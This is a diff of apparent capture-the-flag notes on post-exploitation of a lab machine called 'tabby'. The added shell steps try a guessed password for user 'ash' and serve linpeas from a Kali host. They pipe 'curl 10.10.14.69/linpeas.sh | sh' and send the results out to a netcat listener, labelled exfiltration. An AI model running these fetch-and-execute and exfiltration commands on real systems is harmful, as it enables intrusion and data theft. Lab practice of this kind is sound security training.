@@ -255,13 +255,22 @@ find / > filesystem 2>&1 # get filesystem layout.
 
 # look for ports.
 netstat -nao
+
+# we should try to switch to a user with more rights.
+# we know about ash:
+su ash # maybe: $3cureP4s5w0rd123!
+# that did not work.
+
 # maybe we can run lipeas...
 ```
 
 ```sh
 # kali:
-cd /opt
-python3 -m http.server 80
+curl tabby:8080/shell/filesystem > filesystem
+grep "^/home" filesystem # let's look for user directories.
+# we found ash again.
+
+python3 -m http.server 80 --directory /opt
 ```
 
 ```sh
@@ -271,7 +280,7 @@ chmod +x linpeas.sh
 ./linpeas.sh -a | tee linpeas.log
 
 # alternatively, don't save it:
-curl 10.10.14.69 | sh -
+curl 10.10.14.69/linpeash.sh | sh
 ```
 
 ```sh
@@ -329,4 +338,30 @@ tmux
 # press: ctrl-b ctrl-b "
 # tmux should span the entire width and height.
 # tmux works, we have tab completion, control works, vim works!
+
+id
+umask -s
+pushd `pwd`
+cd /var/www/html
+ll # see alias above.
+# ./files belongs to us
+cd files
+touch test # but it's a read only file-system.
+
+popd # back to /var/lib/tomcat9
+```
+
+```sh
+# on kali:
+# exfiltrate:
+cd /root/projects/tabby/exfil
+mkdir ash_user && cd ash_user
+
+nc -lnvp 12345 > linpeas_ash.log # blocking.
+tail -n+1 -F linpeas_ash.log # blocking.
+```
+
+```sh
+# on tabby/ash:
+curl 10.10.14.69/linpeas.sh | sh | nc 10.10.14.69 12345
 ```
